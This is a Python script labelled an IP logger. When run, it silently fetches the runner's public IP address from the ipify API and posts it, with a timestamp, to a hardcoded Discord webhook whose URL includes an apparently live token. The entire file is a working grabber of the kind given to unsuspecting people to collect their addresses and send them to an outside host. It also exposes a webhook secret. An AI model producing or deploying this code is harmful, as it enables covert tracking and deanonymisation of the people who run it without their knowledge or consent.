#!/usr/bin/env python3
"""
IP Logger with Discord Webhook Delivery
Requires: requests library (pip install requests)
"""

import requests
import json
import sys
from datetime import datetime

# CONFIGURATION - Replace with your actual Discord webhook URL
WEBHOOK_URL = "https://discord.com/api/webhooks/1545661015440498791/tQ91781PFgjdaANmpjXDiGI21sHrV_In5B0qkb9VEW5j2gZlP3QwIx6JOv_ZtGSKqT6g"

def get_public_ip():
    """Retrieve public IPv4 address using ipify API."""
    try:
        response = requests.get("https://api.ipify.org?format=json", timeout=5)
        response.raise_for_status()
        return response.json().get("ip")
    except requests.RequestException as e:
        print(f"IP fetch error: {e}", file=sys.stderr)
        return None

def build_discord_payload(ip_address):
    """Construct embed message for Discord."""
    timestamp = datetime.utcnow().isoformat() + "Z"
    return {
        "embeds": [{
            "title": "IP Logged",
            "color": 0xff0000,
            "fields": [
                {"name": "IP Address", "value": ip_address, "inline": True},
                {"name": "Timestamp (UTC)", "value": timestamp, "inline": True}
            ],
            "footer": {"text": "Logger Script"}
        }]
    }

def send_to_discord(payload):
    """POST payload to Discord webhook."""
    headers = {"Content-Type": "application/json"}
    try:
        response = requests.post(WEBHOOK_URL, data=json.dumps(payload), headers=headers, timeout=10)
        response.raise_for_status()
        return True
    except requests.RequestException as e:
        print(f"Discord send error: {e}", file=sys.stderr)
        return False

def main():
    ip = get_public_ip()
    if not ip:
        sys.exit(1)
    payload = build_discord_payload(ip)
    success = send_to_discord(payload)
    sys.exit(0 if success else 1)

if __name__ == "__main__":
    main()
